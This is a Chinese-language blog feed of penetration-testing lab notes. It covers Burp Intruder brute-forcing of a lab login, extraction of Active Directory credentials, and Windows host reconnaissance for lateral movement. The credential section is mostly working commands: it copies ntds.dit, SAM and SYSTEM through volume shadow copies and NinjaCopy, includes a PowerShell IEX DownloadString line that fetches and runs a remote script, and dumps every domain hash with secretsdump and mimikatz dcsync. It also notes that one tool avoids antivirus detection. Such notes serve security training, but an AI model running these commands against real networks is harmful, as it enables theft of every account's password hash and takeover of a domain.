<li><p>模糊测试 很多输入型的漏洞，如SQL注入，跨站点脚本和文件路径遍历可以通过请求参数提交各种测试字符串，并分析错误消息和其他异常情况，来对应用程序进行检测。由于的应用程序的大小和复杂性，手动执行这个测试是一个耗时且繁琐的过程。这样的场景，您可以设置Payload，通过Burp Intruder自动化地对Web应用程序进行模糊测试。</p>
</li>
</ol>
<h5 id="1-抓取登录框的数据包，并将数据包发送至Intruder模块"><a href="#1-抓取登录框的数据包，并将数据包发送至Intruder模块" class="headerlink" title="(1)  抓取登录框的数据包，并将数据包发送至Intruder模块"></a>(1)  抓取登录框的数据包，并将数据包发送至Intruder模块</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/16.png"></p>
<h5 id="2-将需要爆破的参数标记"><a href="#2-将需要爆破的参数标记" class="headerlink" title="(2)  将需要爆破的参数标记"></a>(2)  将需要爆破的参数标记</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/17.png"></p>
<h5 id="3-因为已知用户名是hetian，密码为50-100之间一个数，所以只要将pas参数标记，然后Positions内payload选择Number，从50-100，每次加一进行爆破"><a href="#3-因为已知用户名是hetian，密码为50-100之间一个数，所以只要将pas参数标记，然后Positions内payload选择Number，从50-100，每次加一进行爆破" class="headerlink" title="(3)  因为已知用户名是hetian，密码为50-100之间一个数，所以只要将pas参数标记，然后Positions内payload选择Number，从50-100，每次加一进行爆破"></a>(3)  因为已知用户名是hetian，密码为50-100之间一个数，所以只要将pas参数标记，然后Positions内payload选择Number，从50-100，每次加一进行爆破</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/18.png"></p>
<h5 id="4-爆破后发现69返回长度不一样，查看response，发现回显you-got-it"><a href="#4-爆破后发现69返回长度不一样，查看response，发现回显you-got-it" class="headerlink" title="(4)  爆破后发现69返回长度不一样，查看response，发现回显you got it"></a>(4)  爆破后发现69返回长度不一样，查看response，发现回显you got it</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/19.png"></p>
<h5 id="5-返回网页，使用-用户名hetian-密码69-成功登录"><a href="#5-返回网页，使用-用户名hetian-密码69-成功登录" class="headerlink" title="(5)  返回网页，使用 用户名hetian 密码69 成功登录"></a>(5)  返回网页，使用 用户名hetian 密码69 成功登录</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/20.png"></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>实验笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>域内密码凭证获取</title>
    <url>/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/</url>
    <content><![CDATA[<h4 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h4><h3 id="0x00-活动目录数据库"><a href="#0x00-活动目录数据库" class="headerlink" title="0x00 活动目录数据库"></a>0x00 活动目录数据库</h3><blockquote>
<ul>
<li>由ntds.dit文件构成</li>
<li>默认存储在所有域控制器上的%SystemRoot%\NTSD文件夹中</li>
<li>只能通过域控制器进程和协议访问<br>ntds.dit：活动目录数据库，包括有关域用户、组和组成员身份的信息。它还包括域中所有用户的密码哈希值。</li>
</ul>
</blockquote>
<p>为了保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。因此想要破解sam文 件与ntds.dit文件都需要拥有一个system文件。</p>
<span id="more"></span>

<p>由于Windows阻止对这些文件的标准读取或复制操作，因此必须使用特殊技术来获取副本。</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">NTDS.DIT	:	Windows<span class="symbol">\N</span>TDS<span class="symbol">\N</span>TDS.dit</span><br><span class="line">SYSTEM		:	Windows<span class="symbol">\S</span>ystem32<span class="symbol">\c</span>onfig<span class="symbol">\S</span>YSTEM</span><br><span class="line">SAM			:	Windows<span class="symbol">\S</span>ystem32<span class="symbol">\c</span>onfig<span class="symbol">\S</span>AM</span><br></pre></td></tr></table></figure>

<p>PS : SAM存储当前主机用户密码哈希</p>
<p>​        NTDS.DIT存储这域内所有用户密码哈希        </p>
<h3 id="0x01-获取NTSD-DIT"><a href="#0x01-获取NTSD-DIT" class="headerlink" title="0x01 获取NTSD.DIT"></a>0x01 获取NTSD.DIT</h3><h4 id="Volume-Shadow-Copy-Service"><a href="#Volume-Shadow-Copy-Service" class="headerlink" title="Volume Shadow Copy Service"></a>Volume Shadow Copy Service</h4><p>Volume Shadow Copy Service (VSS) 卷影复制服务是微软从 Windows XP 开始提供的用于创建一致性的时间 点副本（也就是快照）的服务框架。</p>
<ul>
<li>用于数据备份 </li>
<li>支持Windows Server 2003 及以上操作系统 </li>
<li>系统默认在特定条件下自动创建数据备份，如补丁安装后。在Win7系统大概每隔一周自动创建备份，该时间 无法确定 </li>
<li>禁用VSS会影响系统正常使用，如 System Restore和 Windows Server Backup</li>
</ul>
<h4 id="Ntdsutil"><a href="#Ntdsutil" class="headerlink" title="Ntdsutil"></a>Ntdsutil</h4><h5 id="交互式："><a href="#交互式：" class="headerlink" title="交互式："></a>交互式：</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ntdsutil</span><br><span class="line">snapshot</span><br><span class="line">activate instance ntds</span><br><span class="line">create</span><br><span class="line"><span class="built_in">mount</span> [<span class="type">GUID</span>]			//<span class="built_in">copy</span> 完之后再执行</span><br><span class="line">unmout [<span class="type">GUID</span>]</span><br><span class="line"><span class="built_in">del</span> [<span class="type">GUID</span>]</span><br><span class="line">quit</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>

<p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/1.png"></p>
<h5 id="非交互式"><a href="#非交互式" class="headerlink" title="非交互式:"></a>非交互式:</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit		//创建快照</span><br><span class="line">ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit				//挂载快照</span><br><span class="line"><span class="built_in">copy</span> MOUNT_POINT\windows\ntds\ntds.dit c:\temp\ntds.dit			//复制ntds.dit</span><br><span class="line">ntdsutil snapshot &quot;unmount &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit		//删除快照</span><br></pre></td></tr></table></figure>



<h4 id="Ntdsutil-InstallFromMedia"><a href="#Ntdsutil-InstallFromMedia" class="headerlink" title="Ntdsutil-InstallFromMedia"></a>Ntdsutil-InstallFromMedia</h4><h5 id="交互式：-1"><a href="#交互式：-1" class="headerlink" title="交互式："></a>交互式：</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ntdsutil</span><br><span class="line">activate instance ntds</span><br><span class="line">ifm</span><br><span class="line">create full &lt;Drive&gt;:\&lt;Folder&gt;</span><br><span class="line">quit</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>

<p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/2.png"></p>
<h5 id="非交互式-1"><a href="#非交互式-1" class="headerlink" title="非交互式:"></a>非交互式:</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ntdsutil <span class="string">&quot;activate instance ntds&quot;</span> ifm “create full C:\ntds” quit quit</span><br></pre></td></tr></table></figure>



<h4 id="Vssadmin"><a href="#Vssadmin" class="headerlink" title="Vssadmin"></a>Vssadmin</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">vssadmin list shadows										//查询当前系统的快照</span><br><span class="line">vssadmin create shadow /<span class="keyword">for</span>=c:									//创建快照</span><br><span class="line"><span class="built_in">copy</span> \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\NTDS\ntds.dit c:\ntds2.dit		//复制文件</span><br><span class="line">vssadmin delete shadows /<span class="keyword">for</span>=c: /quiet								//删除快照</span><br><span class="line">vssadmin delete Shadows /All /quie								//删除快照</span><br></pre></td></tr></table></figure>

<p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/3.png"></p>
<h5 id="mklink"><a href="#mklink" class="headerlink" title="mklink"></a>mklink</h5><p>无法直接访问 \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy23中的文件 </p>
<p>可通过创建符号链接访问快照中的文件： </p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mklink /d c:\test\ \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy23\</span><br><span class="line"><span class="built_in">rd</span> c:\testvsc</span><br></pre></td></tr></table></figure>



<h4 id="Vshadow"><a href="#Vshadow" class="headerlink" title="Vshadow"></a>Vshadow</h4><p>Vshadow：是一个简单的指令行工具，它允许任何人创建卷影拷贝。系统默认不支持，可在<code>Microsoft Windows Software Development Kit (SDK)</code>中获得该工具。（不会被杀软杀）</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">vshadow.exe <span class="literal">-q</span>								//查询当前快照</span><br><span class="line">vshadow.exe <span class="literal">-p</span> <span class="literal">-nw</span> C:							//创建快照</span><br><span class="line"><span class="built_in">copy</span> [<span class="type">Shadow</span> <span class="type">copy</span> <span class="type">device</span> <span class="type">name</span>]\windows\ntds\ntds.dit c:\ntds.dit	//复制</span><br><span class="line">vshadow.exe <span class="literal">-dx</span>=ShadowCopySetId						//删除</span><br><span class="line">vshadow.exe <span class="literal">-ds</span>=ShadowCopyId</span><br></pre></td></tr></table></figure>

<h5 id="查询快照"><a href="#查询快照" class="headerlink" title="查询快照"></a>查询快照</h5><p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/4.png"></p>
<h5 id="创建快照"><a href="#创建快照" class="headerlink" title="创建快照"></a>创建快照</h5><p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/5.png"></p>
<h5 id="复制"><a href="#复制" class="headerlink" title="复制"></a>复制</h5><p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/6.png"></p>
<h4 id="NinjaCopy"><a href="#NinjaCopy" class="headerlink" title="NinjaCopy"></a>NinjaCopy</h4><p>通过NinjaCopy获得域控服务器NTDS.dit文件,没有调用Volume Shadow Copy服务，所以不会产生日志文件7036。</p>
<h5 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set-executionpolicy</span> Bypass			//修改powershell执行策略</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\<span class="built_in">invoke-NinjaCopy</span>.ps1</span><br><span class="line"><span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SAM <span class="literal">-LocalDestination</span> .\sam.hive</span><br><span class="line"><span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SYSTEM <span class="literal">-LocalDestination</span> .\system.hive</span><br><span class="line"><span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\windows\ntds\ntds.dit <span class="literal">-LocalDestination</span> .\ntds.dit</span><br></pre></td></tr></table></figure>

<p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/7.png"></p>
<h5 id="cobaltstrike"><a href="#cobaltstrike" class="headerlink" title="cobaltstrike"></a>cobaltstrike</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell<span class="literal">-import</span> C:\Users\<span class="number">4600</span>\Desktop\<span class="built_in">Invoke-NinjaCopy</span>.ps1</span><br><span class="line">powershell <span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SAM <span class="literal">-LocalDestination</span> c:\sam.hive</span><br><span class="line">powershell <span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SYSTEM <span class="literal">-LocalDestination</span></span><br><span class="line">c:\system.hive</span><br><span class="line">powershell <span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> <span class="string">&quot;C:\windows\ntds\ntds.dit&quot;</span> <span class="literal">-LocalDestination</span> C:\ntds.dit</span><br></pre></td></tr></table></figure>

<h5 id="远程加载"><a href="#远程加载" class="headerlink" title="远程加载"></a>远程加载</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://ip:port/InvokeNinjaCopy.ps1&#x27;</span>);<span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SAM <span class="literal">-LocalDestination</span> c:\sam1.hive</span><br><span class="line"></span><br><span class="line">powershell.exe <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://ip:port/InvokeNinjaCopy.ps1&#x27;</span>);<span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SYSTEM <span class="literal">-LocalDestination</span> c:\system1.hive</span><br><span class="line"></span><br><span class="line">powershell.exe <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://ip:port/InvokeNinjaCopy.ps1&#x27;</span>);<span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\ntds\ntds.dit <span class="literal">-LocalDestination</span> c:\ntds1.dit</span><br></pre></td></tr></table></figure>



<h3 id="0x02-解密ntds-dit"><a href="#0x02-解密ntds-dit" class="headerlink" title="0x02 解密ntds.dit"></a>0x02 解密ntds.dit</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">esentutl /p /o ntds.dit			//修复复制出来的数据库文件</span><br></pre></td></tr></table></figure>

<h4 id="QuarkPwDump"><a href="#QuarkPwDump" class="headerlink" title="QuarkPwDump"></a>QuarkPwDump</h4><p>Quarks PwDump 是一款开放源代码的Windows用户凭据提取工具，它可以抓取windows平台下多种类型的 用户凭据，包括：本地帐户、域帐户、缓存的域帐户和Bitlocker。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">QuarksPwDump.exe -<span class="literal">-dump</span><span class="literal">-hash</span><span class="literal">-domain</span> -<span class="literal">-output</span> de1ay.com.txt -<span class="literal">-ntds</span><span class="operator">-file</span> ntds.dit</span><br></pre></td></tr></table></figure>

<p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/8.png"></p>
<h4 id="secretsdump"><a href="#secretsdump" class="headerlink" title="secretsdump"></a>secretsdump</h4><p>impacket 套件中的 secretsdump.py 脚本解密，速度有点慢</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">secretsdump.exe <span class="literal">-sam</span> sam.hive <span class="literal">-security</span> security.hive <span class="literal">-system</span> system.hive LOCAL</span><br><span class="line">secretsdump.exe <span class="literal">-system</span> system.hive <span class="literal">-ntds</span> ntds.dit LOCAL</span><br></pre></td></tr></table></figure>

<p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/9.png"></p>
<h4 id="NtdsAudit"><a href="#NtdsAudit" class="headerlink" title="NtdsAudit"></a>NtdsAudit</h4><p>NtdsAudit可以十分高效的破解ntds文件并将全部域用户信息导出方便查找域用户状态。 将ntds.dit文件和SYSTEM文件放在同一目录下执行命令</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">NtdsAudit.exe <span class="string">&quot;ntds.dit&quot;</span> <span class="literal">-s</span> <span class="string">&quot;system.hive&quot;</span> <span class="literal">-p</span> pwdump.txt -<span class="literal">-users</span><span class="literal">-csv</span> users.csv</span><br></pre></td></tr></table></figure>

<p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/10.png"></p>
<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p>使用Mimikatz的<code>dcsync</code>功能，可以利用目录复制服务（Directory Replication Service, DRS）从NTDS.DIT文件中提取密码哈希值。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:de1ay.com /user:mssql			//获取单个用户的详细信息</span><br><span class="line">lsadump::dcsync /domain:de1ay.com /all /cvs			//获取所有用户</span><br><span class="line">mimikatz lsadump::lsa /inject					//查看所有用户的详细信息</span><br></pre></td></tr></table></figure>

<p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/11.png"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows主机信息收集</title>
    <url>/2021/02/25/Windows%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h4 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h4><h2 id="0x00-什么是内网渗透"><a href="#0x00-什么是内网渗透" class="headerlink" title="0x00  什么是内网渗透"></a>0x00  什么是内网渗透</h2><p>在拿到webshell的时候，想办法获得系统信息拿到系统权限，进入到网络系统内部之后收集内部网络的各种 信息，获取内部网络有价值的人员、资产信息</p>
<ol>
<li><p>内网基础环境判断</p>
<p>IP、网关、DNS、是否能连通外网、网络连接及端口、本机host文件、机器的代理、是否在域内，域名是什么</p>
</li>
<li><p>分析机器所处位置区域 </p>
<p>DMZ区、办公区、生产区、核心DB等等</p>
</li>
<li><p>分析机器的角色 </p>
<p>普通WEB服务器、开发服务器、文件服务器、代理服务器、DNS服务器、数据存储服务器等等</p>
</li>
<li><p>分析进出口流量是否能连通 </p>
<p>协议的判断：常见的TCP、DNS、HTTP、ICMP等协议 端口判断：外网vps做监听，内网机器测试常见端口，常见能出去的端口有80,8080,443,53,110,123 等。</p>
</li>
</ol>
<span id="more"></span>

<h2 id="0x01-常见名词解释"><a href="#0x01-常见名词解释" class="headerlink" title="0x01  常见名词解释"></a>0x01  常见名词解释</h2><h4 id="1-工作组"><a href="#1-工作组" class="headerlink" title="1. 工作组"></a>1. 工作组</h4><p><strong>工作组</strong><code>Work Group</code>是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。</p>
<p>比如在一个网络内，可能有成百上千台工作电脑，如果这些电脑不进行分组，都列在“网上邻居”内，可想而知会有多么乱。</p>
<p>为了解决这一问题，Windows 9x/NT/2000 引用了“工作组”这个概念，比如一所高校，会分为诸如数学系、中文系之类的，然后数学系的电脑全都列入数学系的工作组中，中文系的电脑全部都列入到中文系的工作组中……如果你要访问某个系别的资源，就在“网上邻居”里找到那个系的工作组名，双击就可以看到那个系别的电脑了。</p>
<p>在工作组中所有的计算机都是平等的，没有管理与被管理之分，因此工作组网络也称为对等网络。</p>
<ol>
<li>默认情况下所有计算机都处在名为WORKGROUP的工作组中 </li>
<li>工作组资源管理模式适合于网络中计算机不多，对管理要求不严格的情况。 </li>
<li>它的建立步骤简单，使用起来也很好上手。大部分中小公司都采取工作组的方式对资源进行权限分配和目录共 享。 </li>
<li>相同组中的不同用户通过对方主机的用户名和密码可以查看对方共享的文件夹，默认共享的是 Users 目录。</li>
<li>不同组的不同用户通过对方主机的用户名和密码也可以查看对方共享的文件夹。 </li>
<li>所以工作组并不存在真正的集中管理作用,工作组里的所有计算机都是对等的,也就是没有服务器和客户机之分的。</li>
</ol>
<h3 id="2-域"><a href="#2-域" class="headerlink" title="2.  域"></a>2.  域</h3><h4 id="域-Domain"><a href="#域-Domain" class="headerlink" title="域  Domain"></a>域  <code>Domain</code></h4><p>可以简单的理解成工作组的升级版，如果说工作组是“免费旅店”那么域就是“星级宾馆”；工作组可以随便进进出出，而域则有严格的控制。</p>
<p>在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为域控制器。</p>
<h4 id="域控制器-Domain-Controller"><a href="#域控制器-Domain-Controller" class="headerlink" title="域控制器  Domain Controller"></a>域控制器  <code>Domain Controller</code></h4><p>简写为 <code>DC</code>，域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。</p>
<p>当电脑连入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确的，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，这样就在一定程度上保护了网络上的资源。</p>
<p>正是因为域控起到了一个身份验证的作用，因此站在渗透的角度来说，拿下域控是至关重要的。拿下了域控，就相当于拿到了整个域内所有计算机的账号和密码。</p>
<p>而要想实现域环境，就必须要计算机中安装活动目录，也可以说如果在内网中的一台计算机上安装了活动目录，那它就变成了域控制器。在域中除了域控制器还有成员服务器、客户机、独立服务器。</p>
<h4 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h4><p>顾名思义，在一个域下新建了一个域便称其为子域。形象的来说，一个部门一个域，那个如果这个部门还有分部，那每个分部就可被称为子域，这个大的部门便称为父域。每个域中都有独立的安全策略。</p>
<h4 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h4><p>域树由多个域组成，这些域共享同一表结构和配置，形成一个连续的名字空间。</p>
<p>树中的域通过信任关系连接起来，活动目录包含一个或多个域树。域树中的域层次越深级别越低，一个“.”代表一个层次，如域child.Microsoft.com 就比 Microsoft.com这个域级别低，因为它有两个层次关系，而Microsoft.com只有一个层次。</p>
<p>而域Grandchild.Child.Microsoft.com又比 Child.Microsoft.com级别低，道理一样。他们都属于同一个域树。Child.Microsoft.com就属于Microsoft.com的子域。</p>
<p>多个域树可以组成一个域林。</p>
<h4 id="域林"><a href="#域林" class="headerlink" title="域林"></a>域林</h4><p>域林是指由一个或多个没有形成连续名字空间的域树组成，它与域树最明显的区别就在于域林之间没有形成连续的名字空间，而域树则是由一些具有连续名字空间的域组成。</p>
<p>但域林中的所有域树仍共享同一个表结构、配置和全局目录。域林中的所有域树通过Kerberos 信任关系建立起来，所以每个域树都知道Kerberos信任关系，不同域树可以交叉引用其他域树中的对象。域林都有根域，域林的根域是域林中创建的第一个域，域林中所有域树的根域与域林的根域建立可传递的信任关系.</p>
<p>比如benet.com.cn,则可以创建同属与一个林的accp.com.cn,他们就在同一个域林里.</p>
<p>当创建第一个域控制器的时候，就创建了第一个域（也称林根域），和第一个林。</p>
<p>林，是一个或多个共享公共架构和全局编录的域组成，每个域都有单独的安全策略，和与其他域的信任关系。一个单位可以有多个林。</p>
<h3 id="3-活动目录"><a href="#3-活动目录" class="headerlink" title="3.  活动目录"></a>3.  活动目录</h3><p><strong>活动目录</strong> <code>Active Directory</code> ，简写为 <code>AD</code>，它是 Windows Server 中负责架构中大型网络环境的集中式目录管理服务，在Windows 2000 Server 开始内置于 Windows Server 产品中。</p>
<p>目录包含了有关各种对象，例如用户、用户组、计算机、域、组织单位（OU）以及安全策略的信息。目录存储在域控上，并且可以被网络应用程序或者服务所访问。</p>
<p>活动目录就相当于内网中各种资源的一个目录，通过活动目录用户可以快速定位到这些资源的位置。</p>
<h3 id="4-DMZ"><a href="#4-DMZ" class="headerlink" title="4.  DMZ"></a>4.  DMZ</h3><p>DMZ <code>demilitarized zone</code> ，中文名为“隔离区”，或称“非军事化区”。它是为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，从而设立的一个非安全系统与安全系统之间的缓冲区。</p>
<p>DMZ 区可以理解为一个不同于外网或内网的特殊网络区域，DMZ 内通常放置一些不含机密信息的公用服务器，比如 WEB 服务器、E-Mail 服务器、FTP 服务器等。这样来自外网的访问者只可以访问 DMZ 中的服务，但不可能接触到存放在内网中的信息等，即使 DMZ 中服务器受到破坏，也不会对内网中的信息造成影响。</p>
<h3 id="5-域内的各种权限"><a href="#5-域内的各种权限" class="headerlink" title="5.  域内的各种权限"></a>5.  域内的各种权限</h3><p>首先要理解一下组的概念，在组里包含了很多用户，当管理员想要给某个用户分配权限时，只需要将用户加入到对应权限的组里就行，从而提高了管理效率，常见的组有：域本地组、全局组、通用组。</p>
<p><strong>域本地组</strong></p>
<p>成员范围：所有的域；使用范围：自己所在的域</p>
<p><strong>全局组</strong></p>
<p>成员范围：自己所在的域；使用范围：所有的域</p>
<p><strong>通用组</strong></p>
<p>成员范围：所有的域；使用范围：所有的域</p>
<p><strong>A-G-DL-P 策略</strong></p>
<p>A-G-DL-P 策略是将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。</p>
<ul>
<li>A 表示用户账号</li>
<li>G 表示全局组</li>
<li>U 表示通用组</li>
<li>DL 表示域本地组</li>
<li>P 表示资源权限</li>
</ul>
<h2 id="0x02-工作组信息收集"><a href="#0x02-工作组信息收集" class="headerlink" title="0x02  工作组信息收集"></a>0x02  工作组信息收集</h2><h4 id="1-用户信息收集"><a href="#1-用户信息收集" class="headerlink" title="1.  用户信息收集"></a>1.  用户信息收集</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#查看本机用户列表</span><br><span class="line"><span class="built_in">net</span> user</span><br><span class="line"></span><br><span class="line">#获取本地管理员信息</span><br><span class="line"><span class="built_in">net</span> localgroup administrators</span><br><span class="line"></span><br><span class="line">#查看当前在线用户和会话</span><br><span class="line">quser</span><br><span class="line">query user</span><br><span class="line">query user || qwinsta</span><br><span class="line"></span><br><span class="line">#查当前用户在目标系统中的具体权限</span><br><span class="line">whoami /all</span><br><span class="line"></span><br><span class="line">#查看当前权限</span><br><span class="line">whoami &amp;&amp; whoami /priv</span><br><span class="line"></span><br><span class="line">#查当前机器中所有的组名,了解不同组的职能,如</span><br><span class="line">IT,HR,ADMIN,FILE</span><br><span class="line"><span class="built_in">net</span> localgroup</span><br></pre></td></tr></table></figure>

<h4 id="2-系统信息收集"><a href="#2-系统信息收集" class="headerlink" title="2.  系统信息收集"></a>2.  系统信息收集</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#查询网络配置信息。进行IP地址段信息收集</span><br><span class="line"><span class="built_in">ipconfig</span> /all</span><br><span class="line"></span><br><span class="line">#查询操作系统及软件信息</span><br><span class="line">systeminfo | <span class="built_in">findstr</span> /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; # 英文系统</span><br><span class="line">systeminfo | <span class="built_in">findstr</span> /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot; #中文系统</span><br><span class="line"></span><br><span class="line">#查看当前系统版本</span><br><span class="line">wmic OS get Caption,CSDVersion,OSArchitecture,Version</span><br><span class="line"></span><br><span class="line">#查看系统体系结构</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">%PROCESSOR_ARCHITECTURE%</span></span><br><span class="line"></span><br><span class="line">#查询本机服务信息</span><br><span class="line">wmic service list brief</span><br><span class="line"></span><br><span class="line">#查看安装的软件的版本、路径等</span><br><span class="line">wmic product get name, version</span><br><span class="line">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name, version&quot;</span><br><span class="line"></span><br><span class="line">#查询进程信息</span><br><span class="line">tasklist</span><br><span class="line">wmic process list brief</span><br><span class="line"></span><br><span class="line">#查看启动程序信息</span><br><span class="line">wmic startup get command,caption</span><br><span class="line"></span><br><span class="line">#查看计划任务</span><br><span class="line"><span class="built_in">at</span>（before win10）</span><br><span class="line">schtasks /query /fo LIST /v（win10）</span><br><span class="line"></span><br><span class="line">#查看主机开机时间</span><br><span class="line"><span class="built_in">net</span> statistics workstation</span><br><span class="line"></span><br><span class="line">#列出或断开本地计算机与所连接的客户端的对话</span><br><span class="line"><span class="built_in">net</span> session</span><br><span class="line"></span><br><span class="line">#查看远程连接信息</span><br><span class="line">cmdkey /l</span><br><span class="line"></span><br><span class="line">#查看补丁列表</span><br><span class="line">systeminfo | <span class="built_in">findstr</span> KB</span><br><span class="line"></span><br><span class="line">#查看补丁的名称、描述、ID、安装时间等</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line"></span><br><span class="line">#查看杀软</span><br><span class="line">WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 <span class="built_in">Path</span> AntiVirusProduct Get displayName/<span class="built_in">Format</span>:List</span><br></pre></td></tr></table></figure>

